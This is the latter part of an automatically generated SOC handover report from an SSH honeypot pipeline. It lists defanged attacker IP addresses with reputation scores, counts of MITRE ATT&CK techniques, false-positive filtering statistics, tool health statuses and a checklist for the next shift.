| `175.170.144[.]17` | CN | CHINA UNICOM Liaoning province network | **100** ⚠️ | 37 |
| `173.249.0[.]223` | FR | Contabo GmbH | **100** ⚠️ | 6 |
| `92.55.69[.]185` | MK | Kabel-L-Net Labunista Kabelski Operator | **100** ⚠️ | 0 |
| `125.138.175[.]113` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `143.110.178[.]27` | IN | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `110.93.224[.]226` | PK | Transworld Associates (Pvt.) Ltd. | **100** ⚠️ | 10 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 395 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 165 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 124 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 64 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 64 |

---

## 🔕 False Positive Summary (35 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 26 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 669 cases |
| Tool 34  | Credential Extractor        | ✅ 289 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 56 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 35 filtered (5.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 37 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 124 priority case(s) shown individually · 45 recon entry/entries in table (19 group(s) consolidating 484 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-09T07:54:38Z_
